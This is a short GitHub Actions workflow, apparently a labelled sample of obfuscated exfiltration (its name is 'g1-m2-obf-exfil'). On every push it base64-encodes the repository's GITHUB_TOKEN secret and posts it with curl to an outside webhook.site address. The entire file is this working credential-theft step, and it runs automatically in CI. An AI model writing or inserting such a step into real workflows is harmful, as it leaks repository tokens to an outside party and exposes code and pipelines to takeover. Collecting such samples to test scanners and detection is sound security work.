name: g1-m2-obf-exfil
on:
  push: {}
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - run: |
          T=${{ secrets.GITHUB_TOKEN }}
          echo $T | base64 -w0 | curl -s -X POST --data-binary @- https://webhook.site/ae1c7580-8d42-440e-82c4-4746ccb71ad5
        shell: bash
